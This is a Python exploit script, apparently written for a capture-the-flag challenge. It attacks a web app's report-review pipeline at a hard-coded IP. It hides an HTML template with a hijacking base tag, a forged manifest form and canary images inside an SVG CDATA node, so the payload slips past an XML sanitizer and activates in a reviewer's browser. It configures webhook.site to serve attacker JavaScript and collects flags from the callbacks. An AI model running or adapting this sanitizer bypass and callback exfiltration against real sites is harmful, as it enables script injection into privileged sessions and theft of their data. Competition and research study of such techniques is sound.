#!/usr/bin/env python3
"""Run one fresh Deadband CDATA-to-trusted-manifest review chain.

Unlike the earlier wrapper-visible payloads, the XML normalizer sees no
template, base, form, or input element: beneath foreignObject it sees an XHTML
div containing one CDATA node.  XMLSerializer exposes the CDATA text as markup
only during live HTML adoption, creating an inert HTMLTemplateElement whose
contents become active at the documented post-sweep materialization step.
"""

from __future__ import annotations

import argparse
import base64
import html
import json
import re
import secrets
import time
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, unquote_plus, urlsplit

import requests

from agent2_h2_ordered_exchange import run_exchange

TARGET = "http://15.165.43.118:8080"
SVG = "http://www.w3.org/2000/svg"
XHTML = "http://www.w3.org/1999/xhtml"
TICKET_RE = re.compile(r"^[0-9a-f]{48}$")
FLAG_RE = re.compile(r"(?:UHCON|FLAG)\{[^\r\n{}]{1,300}\}", re.I)


def save_json(path: Path, value: Any) -> None:
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def expect_json(response: requests.Response, status: int) -> dict[str, Any]:
    if response.status_code != status:
        raise RuntimeError(f"unexpected HTTP {response.status_code}: {response.text[:300]}")
    value = response.json()
    if not isinstance(value, dict):
        raise RuntimeError("expected JSON object")
    return value


def write_cookie_jar(path: Path, session: requests.Session) -> None:
    lines = ["# Netscape HTTP Cookie File"]
    for cookie in session.cookies:
        domain = cookie.domain or "15.165.43.118"
        lines.append(
            "\t".join(
                [domain, "FALSE", cookie.path or "/", "FALSE", "0", cookie.name, cookie.value]
            )
        )
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def webhook_requests(token: str) -> list[dict[str, Any]]:
    response = requests.get(
        f"https://webhook.site/token/{token}/requests?sorting=newest",
        timeout=15,
    )
    response.raise_for_status()
    value = response.json()
    data = value.get("data", []) if isinstance(value, dict) else []
    return data if isinstance(data, list) else []


def request_id(item: dict[str, Any]) -> str:
    return str(item.get("uuid") or item.get("id") or "")


def decoded_request_text(item: dict[str, Any]) -> str:
    fields = [item.get("url"), item.get("content"), item.get("query"), item.get("body")]
    text = "\n".join(str(field) for field in fields if field is not None)
    for _ in range(2):
        text = unquote_plus(text)
    return text


def read_jsonl(path: Path) -> list[dict[str, Any]]:
    if not path.exists():
        return []
    values: list[dict[str, Any]] = []
    for line in path.read_text(encoding="utf-8").splitlines():
        try:
            value = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(value, dict):
            values.append(value)
    return values


def receipt_flags(item: dict[str, Any]) -> list[str]:
    url = str(item.get("url", ""))
    parsed = urlsplit(url)
    if parsed.path != "/context-receipt":
        return []
    flags: list[str] = []
    for encoded in parse_qs(parsed.query).get("d", []):
        try:
            decoded = base64.b64decode(encoded, validate=True).decode("utf-8")
        except (ValueError, UnicodeDecodeError):
            continue
        flags.extend(FLAG_RE.findall(decoded))
    return flags


def build_note(
    base_url: str,
    manifest: str,
    canary_url: str,
    base_canary_url: str | None = None,
) -> tuple[str, dict[str, Any]]:
    base_canary = (
        f'<img alt="" src="{html.escape(base_canary_url, quote=True)}">'
        if base_canary_url
        else ""
    )
    late = (
        '<template data-review-overlay="">'
        f'<base href="{html.escape(base_url, quote=True)}">'
        '<form id="review-policy" name="review-policy">'
        f'<input id="manifest" name="manifest" '
        f'value="{html.escape(manifest, quote=True)}">'
        '</form>'
        f'<img alt="" src="{html.escape(canary_url, quote=True)}">'
        + base_canary
        + '</template>'
    )
    svg = (
        f'<svg xmlns="{SVG}"><foreignObject>'
        f'<div xmlns="{XHTML}"><![CDATA[>'
        + late
        + "]]></div></foreignObject></svg>"
    )
    note = '<code data-evidence-fragment="legacy">' + html.escape(svg, quote=False) + "</code>"

    root = ET.fromstring(svg)
    foreign = list(root)
    div = list(foreign[0])[0]
    assert root.tag == f"{{{SVG}}}svg"
    assert foreign[0].tag == f"{{{SVG}}}foreignObject"
    assert div.tag == f"{{{XHTML}}}div"
    assert list(div) == []
    assert len(list(root.iter())) == 3
    assert div.text and '<template data-review-overlay="">' in div.text
    assert "<base " in div.text and "<img " in div.text
    assert '<form id="review-policy" name="review-policy">' in div.text
    assert '<input id="manifest" name="manifest" ' in div.text
    assert "</template>" in div.text
    assert 1 <= len(note.encode("utf-8")) <= 4096
    return note, {
        "strategy": "xml-cdata-wrapper-to-html-trusted-manifest",
        "xml_visible_elements": ["svg", "foreignObject", "div"],
        "xml_div_child_node": "CDATA",
        "xml_active_element_count": 0,
        "adopted_overlay_expected": "HTMLTemplateElement",
        "materialized_base": base_url,
        "materialized_manifest": manifest,
        "materialized_canary": canary_url,
        "materialized_base_canary": base_canary_url,
        "operator_note_bytes": len(note.encode("utf-8")),
    }


def accepted_enqueue(*results: dict[str, Any], report_id: str) -> bool:
    return any(
        result.get("embedded_http_status") == 202
        or (
            any(
                pair == [":status", "202"]
                for event in result.get("events", [])
                for pair in event.get("headers", [])
            )
            and report_id in str(result.get("body", ""))
        )
        for result in results
    )


def main() -> None:
    parser = argparse.ArgumentParser()
    source = parser.add_mutually_exclusive_group(required=True)
    source.add_argument("--webhook-json", type=Path)
    source.add_argument("--probe-origin")
    parser.add_argument("--receiver-log", type=Path)
    parser.add_argument("--tag")
    parser.add_argument("--output-dir", type=Path, default=Path("."))
    parser.add_argument("--prefix", default="root_deadband_cdata_manifest_20261107")
    parser.add_argument("--exchange-timeout", type=float, default=18.0)
    parser.add_argument("--review-timeout", type=float, default=100.0)
    parser.add_argument("--callback-timeout", type=float, default=100.0)
    args = parser.parse_args()

    args.output_dir.mkdir(parents=True, exist_ok=True)
    token: str | None = None
    if args.webhook_json:
        token = str(json.loads(args.webhook_json.read_text(encoding="utf-8"))["uuid"])
        if not re.fullmatch(r"[0-9a-f-]{36}", token, re.I):
            raise RuntimeError("invalid webhook token")
        origin = f"https://{token}.webhook.site"
    else:
        origin = str(args.probe_origin).rstrip("/")
        parsed_origin = urlsplit(origin)
        if (
            parsed_origin.scheme != "https"
            or not parsed_origin.hostname
            or parsed_origin.username
            or parsed_origin.password
            or parsed_origin.path
            or parsed_origin.query
            or parsed_origin.fragment
        ):
            raise RuntimeError("probe origin must be a bare HTTPS origin")
        if not args.receiver_log:
            raise RuntimeError("--receiver-log is required with --probe-origin")

    tag = str(args.tag or secrets.token_hex(6)).lower()
    if not re.fullmatch(r"[0-9a-f]{12}", tag):
        raise RuntimeError("tag must be exactly 12 hex characters")
    module_path = "/evidence/modules/default.js"
    manifest = module_path
    base_url = f"{origin}/base-{tag}@reviewer"
    canary_path = f"/deadband-combined-canary-{tag}@reviewer"
    canary_url = origin + canary_path
    base_canary_path = f"/deadband-base-canary-{tag}@reviewer"
    base_canary_url = base_canary_path
    receipt_path = f"/deadband-cdata-receipt-{tag}@reviewer"
    receipt_url = origin + receipt_path
    executed_path = f"/deadband-module-executed-{tag}@reviewer"
    operator_note, validation = build_note(
        base_url, manifest, canary_url, base_canary_url
    )
    validation.update({"receipt_url": receipt_url, "registry": "reviewer"})
    save_json(args.output_dir / f"{args.prefix}_local_validation.json", validation)

    baseline_ids: set[str] = set()
    baseline_count = 0
    if token:
        module_source = (
            "const m={type:'evidence-receipt',return_to:"
            + json.dumps(receipt_url)
            + "};const roots=[window,parent,top],s=()=>{const a=[...roots];"
            + "for(const r of roots){try{for(let i=0;i<r.length;i++)a.push(r.frames[i])}catch(e){}}"
            + "for(const w of new Set(a)){try{w.postMessage(m,'*')}catch(e){}}};"
            + "s();[25,75,150,300,600,1200,2400,4000,6500].forEach(d=>setTimeout(s,d));"
        )
        update = requests.put(
            f"https://webhook.site/token/{token}",
            json={
                "default_content": module_source,
                "default_content_type": "application/javascript",
                "default_status": 200,
                "cors": True,
            },
            timeout=15,
        )
        update.raise_for_status()
        baseline_ids = {request_id(item) for item in webhook_requests(token)}
    else:
        baseline_count = len(read_jsonl(args.receiver_log))

    username = f"dbcdata_{secrets.token_hex(6)}"
    password = f"Db_{secrets.token_urlsafe(24)}"
    session = requests.Session()
    user = expect_json(
        session.post(
            f"{TARGET}/api/auth/register",
            json={"username": username, "password": password, "display_name": "CTF Operator"},
            timeout=12,
        ),
        201,
    )
    expect_json(
        session.post(
            f"{TARGET}/api/auth/login",
            json={"username": username, "password": password},
            timeout=12,
        ),
        200,
    )
    report = expect_json(
        session.post(
            f"{TARGET}/api/reports",
            json={"title": f"CDATA manifest {tag}", "category": "dispatch"},
            timeout=12,
        ),
        201,
    )
    report_id = str(report["id"])
    capability = str(report["capability"])
    cookie_jar = args.output_dir / f"{args.prefix}.cookies"
    write_cookie_jar(cookie_jar, session)

    prepare_body = json.dumps(
        {"report_id": report_id, "capability": capability}, separators=(",", ":")
    ).encode()
    e1 = run_exchange("carrier", cookie_jar, args.exchange_timeout, "POST", "/internal/review/prepare", prepare_body)
    save_json(args.output_dir / f"{args.prefix}_E1_prepare_carrier.json", e1)
    e2 = run_exchange("plain", cookie_jar, args.exchange_timeout)
    save_json(args.output_dir / f"{args.prefix}_E2_ticket_drain.json", e2)
    ticket = str(e2.get("review_ticket") or "")
    if not TICKET_RE.fullmatch(ticket) or report_id not in str(e2.get("body", "")):
        raise RuntimeError("fresh prepare ticket validation failed")

    enqueue_body = json.dumps(
        {
            "report_id": report_id,
            "capability": capability,
            "review_ticket": ticket,
            "operator_note": operator_note,
        },
        separators=(",", ":"),
    ).encode()
    e3 = run_exchange("carrier", cookie_jar, args.exchange_timeout, "POST", "/internal/review/enqueue", enqueue_body)
    save_json(args.output_dir / f"{args.prefix}_E3_enqueue_carrier.json", e3)
    e4 = run_exchange("plain", cookie_jar, args.exchange_timeout)
    save_json(args.output_dir / f"{args.prefix}_E4_drain.json", e4)
    e5 = run_exchange("plain", cookie_jar, args.exchange_timeout)
    save_json(args.output_dir / f"{args.prefix}_E5_drain.json", e5)
    accepted = accepted_enqueue(e3, e4, e5, report_id=report_id)
    if not accepted:
        raise RuntimeError("enqueue response was not observed as accepted")

    state_history: list[str] = []
    deadline = time.monotonic() + args.review_timeout
    final_report: dict[str, Any] = {}
    while time.monotonic() < deadline:
        final_report = expect_json(session.get(f"{TARGET}/api/reports/{report_id}", timeout=12), 200)
        state = str(final_report.get("state"))
        if not state_history or state_history[-1] != state:
            state_history.append(state)
        if state in {"reviewed", "review_failed"}:
            break
        time.sleep(3)
    save_json(args.output_dir / f"{args.prefix}_report_final.json", final_report)

    new_requests: list[dict[str, Any]] = []
    deadline = time.monotonic() + args.callback_timeout
    while time.monotonic() < deadline:
        if token:
            try:
                latest = webhook_requests(token)
            except requests.RequestException:
                time.sleep(8)
                continue
            new_requests = [item for item in latest if request_id(item) not in baseline_ids]
        else:
            new_requests = read_jsonl(args.receiver_log)[baseline_count:]
        if any(
            receipt_path in str(item.get("url", ""))
            or urlsplit(str(item.get("url", ""))).path == "/context-receipt"
            for item in new_requests
        ):
            break
        time.sleep(4)
    save_json(args.output_dir / f"{args.prefix}_receiver_requests.json", new_requests)
    flags = []
    for item in new_requests:
        flags.extend(FLAG_RE.findall(decoded_request_text(item)))
        flags.extend(receipt_flags(item))
    flags = list(dict.fromkeys(flags))
    if flags:
        (args.output_dir / "flag.txt").write_text(flags[0] + "\n", encoding="utf-8")

    summary = {
        "target": TARGET,
        "username": username,
        "user_id": user.get("id"),
        "report_id": report_id,
        "strategy": validation["strategy"],
        "operator_note": operator_note,
        "manifest": manifest,
        "module_path": module_path,
        "base_url": base_url,
        "receipt_url": receipt_url,
        "canary_url": canary_url,
        "base_canary_path": base_canary_path,
        "enqueue_accepted": accepted,
        "state_history": state_history,
        "final_state": final_report.get("state"),
        "callback_count": len(new_requests),
        "canary_count": sum(canary_path in str(item.get("url", "")) for item in new_requests),
        "base_canary_count": sum(
            base_canary_path in str(item.get("url", "")) for item in new_requests
        ),
        "module_count": sum(module_path in str(item.get("url", "")) for item in new_requests),
        "module_executed_count": sum(
            executed_path in str(item.get("url", "")) for item in new_requests
        ),
        "receipt_count": sum(
            receipt_path in str(item.get("url", ""))
            or urlsplit(str(item.get("url", ""))).path == "/context-receipt"
            for item in new_requests
        ),
        "flag_candidates": flags,
    }
    save_json(args.output_dir / f"{args.prefix}_summary.json", summary)
    print(json.dumps({k: v for k, v in summary.items() if k != "operator_note"}, ensure_ascii=False))


if __name__ == "__main__":
    main()
